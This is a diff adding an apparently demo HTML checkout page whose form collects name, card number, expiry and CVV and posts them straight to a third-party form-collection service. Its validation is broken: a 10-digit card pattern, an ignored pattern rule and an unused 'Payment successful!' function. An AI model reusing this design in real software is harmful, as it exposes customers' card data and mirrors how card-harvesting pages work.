@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Stylish Modern Checkout Form</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    form {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+      width: 350px;
+      text-align: center;
+    }
+
+    h1 {
+      color: #333;
+    }
+
+    img {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin: 15px 0 5px;
+      font-weight: bold;
+      color: #555;
+    }
+
+    input {
+      width: calc(100% - 20px);
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    small {
+      display: block;
+      color: #777;
+      margin-top: 5px;
+    }
+
+    button {
+      background-color: #4caf50;
+      color: #fff;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+
+  <form id="checkoutForm" action="https://formspree.io/f/xeqyjpvp" method="POST">
+
+    <img src="https://via.placeholder.com/80" alt="Logo">
+
+    <h1>Checkout</h1>
+
+    <label for="name">Name:</label>
+    <input type="text" id="name" name="name" required>
+
+    <label for="cardNumber">Card Number:</label>
+    <input type="tel" id="cardNumber" name="cardNumber" pattern="[0-9]{10}" placeholder="e.g., 1234567890" required>
+    <small>Format: 10 digits</small>
+
+    <label for="expiryDate">Expiry Date:</label>
+    <input type="date" id="expiryDate" name="expiryDate" required>
+
+    <label for="cvv">CVV:</label>
+    <input type="number" id="cvv" name="cvv" pattern="[0-9]{3}" placeholder="e.g., 123" required>
+    <small>Format: Three digits</small>
+
+    <button type="submit">Pay £11.99</button>
+
+  </form>
+
+  <script>
+    function validateForm() {
+      // You can add additional validation logic here if needed
+      alert("Payment successful!");
+    }
+  </script>
+
+</body>
+</html>
